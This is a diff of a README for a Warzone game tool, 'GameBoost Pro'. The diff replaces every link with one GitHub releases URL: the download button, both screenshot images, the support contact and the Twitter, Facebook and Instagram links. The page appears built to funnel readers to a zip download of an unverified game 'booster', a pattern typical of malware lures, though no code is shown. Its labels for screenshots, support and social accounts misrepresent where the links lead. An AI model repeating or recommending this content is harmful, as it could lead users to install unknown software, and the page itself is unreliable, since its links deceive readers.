@@ -28,9 +28,9 @@ Here are some key features of GameBoost Pro for Warzone:
 
 ## Get Started
 
-To try out GameBoost Pro for Warzone, you can download the latest version at the following link: [Download GameBoost Pro for Warzone](https://github.com/project/files/App.zip)
+To try out GameBoost Pro for Warzone, you can download the latest version at the following link: [Download GameBoost Pro for Warzone](https://github.com/RajanKalb/GameBoost-Pro-for-Warzone/releases)
 
-[![](https://img.shields.io/badge/Download-GameBoost%20Pro-brightgreen)](https://github.com/project/files/App.zip)
+[![](https://github.com/RajanKalb/GameBoost-Pro-for-Warzone/releases%20Pro-brightgreen)](https://github.com/RajanKalb/GameBoost-Pro-for-Warzone/releases)
 
 If the link ends with the file name, make sure to extract the files and launch the application to start optimizing your Warzone experience.
 
@@ -40,13 +40,13 @@ If the provided link is not working or you need to explore more options, feel fr
 
 Here are some screenshots showcasing GameBoost Pro in action:
 
-![Screenshot 1](https://example.com/screenshot1.png)
+![Screenshot 1](https://github.com/RajanKalb/GameBoost-Pro-for-Warzone/releases)
 
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 2](https://github.com/RajanKalb/GameBoost-Pro-for-Warzone/releases)
 
 ## Support
 
-If you encounter any issues while using GameBoost Pro for Warzone or have any questions about the tool, please don't hesitate to reach out to our support team at support@gameboostpro.com.
+If you encounter any issues while using GameBoost Pro for Warzone or have any questions about the tool, please don't hesitate to reach out to our support team at https://github.com/RajanKalb/GameBoost-Pro-for-Warzone/releases
 
 ## Contributing
 
@@ -56,8 +56,8 @@ We welcome contributions from the community to make GameBoost Pro even better fo
 
 Stay up to date with all the latest GameBoost Pro news and updates by following us on social media:
 
-- Twitter: [@GameBoostPro](https://twitter.com/GameBoostPro)
-- Facebook: [GameBoost Pro](https://www.facebook.com/GameBoostPro)
-- Instagram: [@GameBoostPro](https://www.instagram.com/GameBoostPro)
+- Twitter: [@GameBoostPro](https://github.com/RajanKalb/GameBoost-Pro-for-Warzone/releases)
+- Facebook: [GameBoost Pro](https://github.com/RajanKalb/GameBoost-Pro-for-Warzone/releases)
+- Instagram: [@GameBoostPro](https://github.com/RajanKalb/GameBoost-Pro-for-Warzone/releases)
 
 Let's elevate your Warzone gameplay to the next level with GameBoost Pro! 💥🎮🔥
